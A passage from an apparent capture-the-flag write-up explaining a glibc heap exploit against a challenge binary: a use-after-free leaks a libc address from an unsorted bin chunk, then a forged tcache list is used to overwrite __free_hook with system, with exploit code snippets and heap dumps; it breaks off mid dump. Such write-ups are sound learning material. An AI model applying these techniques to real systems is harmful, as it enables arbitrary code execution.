</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>add_property(r, <span style="color:#f60">0x10</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;lmao&#39;</span>, <span style="color:#f60">0</span>)
</span></span><span style="display:flex;"><span>leaked_libc <span style="color:#555">=</span> u64(show_property(r)<span style="color:#555">.</span>ljust(<span style="color:#f60">8</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;</span><span style="color:#c30;font-weight:bold">\x00</span><span style="color:#c30">&#39;</span>))
</span></span><span style="display:flex;"><span>log<span style="color:#555">.</span>info(<span style="color:#c30">f</span><span style="color:#c30">&#39;leaked_libc: </span><span style="color:#a00">{</span><span style="color:#366">hex</span>(leaked_libc)<span style="color:#a00">}</span><span style="color:#c30">&#39;</span>)
</span></span><span style="display:flex;"><span>libc_base <span style="color:#555">=</span> leaked_libc <span style="color:#555">-</span> main_arena <span style="color:#555">-</span> <span style="color:#f60">0x60</span>
</span></span><span style="display:flex;"><span>log<span style="color:#555">.</span>info(<span style="color:#c30">f</span><span style="color:#c30">&#39;libc_base: </span><span style="color:#a00">{</span><span style="color:#366">hex</span>(libc_base)<span style="color:#a00">}</span><span style="color:#c30">&#39;</span>)
</span></span><span style="display:flex;"><span>libc<span style="color:#555">.</span>address <span style="color:#555">=</span> libc_base
</span></span><span style="display:flex;"><span>free_hook <span style="color:#555">=</span> libc<span style="color:#555">.</span>symbols[<span style="color:#c30">&#39;__free_hook&#39;</span>]
</span></span><span style="display:flex;"><span>system <span style="color:#555">=</span> libc<span style="color:#555">.</span>symbols[<span style="color:#c30">&#39;system&#39;</span>]
</span></span><span style="display:flex;"><span>log<span style="color:#555">.</span>info(<span style="color:#c30">f</span><span style="color:#c30">&#39;__free_hook@libc: </span><span style="color:#a00">{</span><span style="color:#366">hex</span>(free_hook)<span style="color:#a00">}</span><span style="color:#c30">&#39;</span>)
</span></span><span style="display:flex;"><span>log<span style="color:#555">.</span>info(<span style="color:#c30">f</span><span style="color:#c30">&#39;system@libc: </span><span style="color:#a00">{</span><span style="color:#366">hex</span>(system)<span style="color:#a00">}</span><span style="color:#c30">&#39;</span>)
</span></span></code></pre></td></tr></table>
</div>
</div><p>We simply create a new property without comment, and call <code>show_property</code>. I use <code>0x10</code> for the street size in order to make sure that the <code>malloc</code> call is used the available tcache (tcache[0x20]) instead of consuming our unsorted bin chunk. See below heap after we add the new property:</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>0x55802d04d310	0x0000000000000000	0x0000000000000051
</span></span><span style="display:flex;"><span>0x55802d04d320	0x0000000000000000	0x0000000000000000
</span></span><span style="display:flex;"><span>0x55802d04d330	0x4024000000000000	0x000000000000000a
</span></span><span style="display:flex;"><span>0x55802d04d340	0x000055802d04d370	0x0000000000000010
</span></span><span style="display:flex;"><span>0x55802d04d350	0x000055802d04d390	0x0000000000000427
</span></span><span style="display:flex;"><span>0x55802d04d360	0x0000000000000000	0x0000000000000021
</span></span><span style="display:flex;"><span>0x55802d04d370	0x000000006f616d6c	0x0000000000000000
</span></span><span style="display:flex;"><span>0x55802d04d380	0x0000000000000000	0x0000000000000431	 &lt;-- unsortedbin[all][0]
</span></span><span style="display:flex;"><span>0x55802d04d390	0x00007fe1975bfbe0	0x00007fe1975bfbe0
</span></span><span style="display:flex;"><span>... &lt;-- comment is pointing to this
</span></span><span style="display:flex;"><span>0x55802d04d7b0	0x0000000000000430	0x0000000000000030
</span></span><span style="display:flex;"><span>0x55802d04d7c0	0x0000000000000000	0x000055802d04d010	 &lt;-- tcachebins[0x30][0/1]
</span></span><span style="display:flex;"><span>0x55802d04d7d0	0x0000000000000000	0x0000000000000000
</span></span><span style="display:flex;"><span>0x55802d04d7e0	0x0000000000000000	0x0000000000020821	 &lt;-- Top chunk
</span></span></code></pre></td></tr></table>
</div>
</div><p>You can see that comment is pointing to <code>0x55802d04d390</code>, and then because comment is now a freed chunk inside unsorted bin, and its point to the libc <code>main_arena+0x60</code>, we will be able to retrieve the libc address of the current program.</p>
<h4 id="part-2-overwrite-__free_hook">Part 2: Overwrite <code>__free_hook</code> <a href="#part-2-overwrite-__free_hook" class="anchor">#</a></h4>
<p>Moving on to the next step, we will try to overwrite the <code>__free_hook</code> with <code>system</code>. We need to clean up our <code>property</code> first. To prevent double free happen during <code>remove_property</code>, we need to make the <code>comment</code> object is not a freed chunk. I use <code>change_username</code> to fill up the <code>comment</code> object.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>change_username(r, 0x427, b&#39;lmao&#39;)
</span></span><span style="display:flex;"><span>remove_property(r)
</span></span></code></pre></td></tr></table>
</div>
</div><p>Basically, now the <code>username</code> object and the <code>comment</code> object points to the same address. This is very good for us, because both of them are now pointing to the same freed chunk of unsorted bin.
Remember that, if we call <code>change_username</code> with smaller <strong>STORED</strong> size (which is 0x427+1 in this case), the method will directly replace the values without doing <code>free</code> &amp; <code>malloc</code>. Due to how the glibc works, now, if we try to allocate chunk with rules:</p>
<ul>
<li>Size is smaller than unsorted bin</li>
<li>No available tcache with the desired allocated size</li>
</ul>
<p>It will used the unsorted bin by allocating it in the top of the unsorted bin chunk, and reduce its size. See below illustration</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Let say we have heap like below
</span></span><span style="display:flex;"><span>0x557b64aef380 0x0000000000000000 0x0000000000000431 &lt;-- unsortedbin[all][0]
</span></span><span style="display:flex;"><span>0x557b64aef390 0x0000000000000000 0x0000000000000000
</span></span><span style="display:flex;"><span>0x557b64aef3a0 0x0000000000000000 0x0000000000000000
</span></span><span style="display:flex;"><span>0x557b64aef3b0 0x0000000000000000 0x0000000000000000
</span></span><span style="display:flex;"><span>0x557b64aef3c0 0x0000000000000000 0x0000000000000000
</span></span><span style="display:flex;"><span>0x557b64aef3d0 0x0000000000000000 0x0000000000000000
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>If tcache[0x20] is empty, and we want to allocate 0x20 chunk, it will use the top chunk of the unsorted bin.
</span></span><span style="display:flex;"><span>0x557b64aef380 0x0000000000000000 0x0000000000000021 &lt;-- new allocated chunk
</span></span><span style="display:flex;"><span>0x557b64aef390 0x0000000000000000 0x0000000000000000
</span></span><span style="display:flex;"><span>0x557b64aef3a0 0x0000000000000000 0x0000000000000411 &lt;-- unsortedbin[all][0]
</span></span><span style="display:flex;"><span>0x557b64aef3b0 0x0000000000000000 0x0000000000000000
</span></span><span style="display:flex;"><span>0x557b64aef3c0 0x0000000000000000 0x0000000000000000
</span></span><span style="display:flex;"><span>0x557b64aef3d0 0x0000000000000000 0x0000000000000000
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now, we know that <code>username</code> address is actually pointing to the top of the old unsorted bin chunk (0x431 size), and then after lot of allocations, the <code>username</code> will still points to the same address. And the stored <code>username</code> size is still the same (0x427+1).
Due to the fact that <code>change_username</code> method allow us to directly replace the value if the given size is smaller than the <code>stored</code> size, we are basically able to forge the chunk metadata which allocated between <code>username_address</code> and <code>username_address + 0x427</code></p>
<p>Now, let&rsquo;s try to implement that</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>add_property(r, <span style="color:#f60">0x89</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;lmao&#39;</span>, <span style="color:#f60">0x20</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;lmao&#39;</span>)
</span></span><span style="display:flex;"><span>remove_property(r)
</span></span></code></pre></td></tr></table>
</div>
</div><p>After those code, <code>username</code> and <code>comment</code> won&rsquo;t point to the same. Current heap state:</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>0x55802d04d310	0x0000000000000000	0x0000000000000051   &lt;-- property
</span></span><span style="display:flex;"><span>0x55802d04d320	0x0000000000000000	0x000055802d04d010	 &lt;-- tcachebins[0x50][0/1]
</span></span><span style="display:flex;"><span>0x55802d04d330	0x4024000000000000	0x000000000000000a
</span></span><span style="display:flex;"><span>0x55802d04d340	0x0000000000000000	0x0000000000000089
</span></span><span style="display:flex;"><span>0x55802d04d350	0x000055802d04d7c0	0x0000000000000020
</span></span><span style="display:flex;"><span>0x55802d04d360	0x0000000000000000	0x0000000000000021
</span></span><span style="display:flex;"><span>0x55802d04d370	0x0000000000000000	0x000055802d04d010	 &lt;-- tcachebins[0x20][0/1]
</span></span><span style="display:flex;"><span>0x55802d04d380	0x0000000000000000	0x00000000000000a1
</span></span><span style="display:flex;"><span>0x55802d04d390	0x0000000000000000	0x000055802d04d010	 &lt;-- tcachebins[0xa0][0/1], username
</span></span><span style="display:flex;"><span>0x55802d04d3a0	0x000055802d04d380	0x000055802d04d380
</span></span><span style="display:flex;"><span>0x55802d04d3b0	0x0000000000000000	0x0000000000000000
</span></span><span style="display:flex;"><span>0x55802d04d3c0	0x0000000000000000	0x0000000000000000
</span></span><span style="display:flex;"><span>0x55802d04d3d0	0x0000000000000000	0x0000000000000000
</span></span><span style="display:flex;"><span>0x55802d04d3e0	0x0000000000000000	0x0000000000000000
</span></span><span style="display:flex;"><span>0x55802d04d3f0	0x0000000000000000	0x0000000000000000
</span></span><span style="display:flex;"><span>0x55802d04d400	0x0000000000000000	0x0000000000000000
</span></span><span style="display:flex;"><span>0x55802d04d410	0x0000000000000000	0x0000000000000000
</span></span><span style="display:flex;"><span>0x55802d04d420	0x0000000000000000	0x0000000000000391	 &lt;-- unsortedbin[all][0]
</span></span><span style="display:flex;"><span>0x55802d04d430	0x00007fe1975bfbe0	0x00007fe1975bfbe0
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>0x55802d04d7b0	0x0000000000000390	0x0000000000000030
</span></span><span style="display:flex;"><span>0x55802d04d7c0	0x0000000000000000	0x000055802d04d010	 &lt;-- tcachebins[0x30][0/1], comment
</span></span><span style="display:flex;"><span>0x55802d04d7d0	0x0000000000000000	0x0000000000000000
</span></span><span style="display:flex;"><span>0x55802d04d7e0	0x0000000000000000	0x0000000000020821	 &lt;-- Top chunk
</span></span></code></pre></td></tr></table>
</div>
</div><p>Notes that <code>username</code> still points to <code>0x55802d04d390</code>, and now <code>comment</code> points to <code>0x55802d04d7c0</code>.</p>
<p>Notice that due to the freed <code>comment</code> chunk is not nulled by <code>remove_property</code>, not only we can leak the freed chunk content, we can also overwrite it via <code>edit_property</code>.</p>
<p>So we plan to overwrite the <code>__free_hook</code> via <code>edit_property</code> on the <code>comment</code>. I plan to forge tcache[0x60] linked list (because we don&rsquo;t have any tcache[0x60] yet, so when we allocate it, it will still consume our unsorted bin chunk), to point it to the <code>__free_hook</code>. Let&rsquo;s try to do that.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>add_property(r, <span style="color:#f60">0x49</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;lmao&#39;</span>, <span style="color:#f60">0x49</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;lmao&#39;</span>)
</span></span><span style="display:flex;"><span>edit_property(r, <span style="color:#f60">0x59</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;lmao&#39;</span>, <span style="color:#f60">0</span>)
</span></span><span style="display:flex;"><span>remove_property(r)
</span></span></code></pre></td></tr></table>
</div>
</div><p>Basically, what we do here is we try to allocate two chunk with 0x60 size (<code>street</code> and <code>comment</code>). We want our <code>comment</code> chunk got freed in the last due to the fact that tcache is LIFO (Last-In-First-Out). So, in order to do that, use <code>edit_property</code> to free the <code>street</code> 0x60 chunk, and then call <code>remove_property</code> to free the <code>comment</code> 0x60 chunk. Current heap state:</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>0x55802d04d310	0x0000000000000000	0x0000000000000051
</span></span><span style="display:flex;"><span>0x55802d04d320	0x0000000000000000	0x000055802d04d010	 &lt;-- tcachebins[0x50][0/1]
</span></span><span style="display:flex;"><span>0x55802d04d330	0x4024000000000000	0x000000000000000a
</span></span><span style="display:flex;"><span>0x55802d04d340	0x0000000000000000	0x0000000000000059
</span></span><span style="display:flex;"><span>0x55802d04d350	0x000055802d04d490	0x0000000000000049
</span></span><span style="display:flex;"><span>0x55802d04d360	0x0000000000000000	0x0000000000000021
</span></span><span style="display:flex;"><span>0x55802d04d370	0x0000000000000000	0x000055802d04d010	 &lt;-- tcachebins[0x20][0/1]
</span></span><span style="display:flex;"><span>0x55802d04d380	0x0000000000000000	0x00000000000000a1
</span></span><span style="display:flex;"><span>0x55802d04d390	0x0000000000000000	0x000055802d04d010	 &lt;-- tcachebins[0xa0][0/1]
</span></span><span style="display:flex;"><span>0x55802d04d3a0	0x000055802d04d380	0x000055802d04d380
</span></span><span style="display:flex;"><span>0x55802d04d3b0	0x0000000000000000	0x0000000000000000
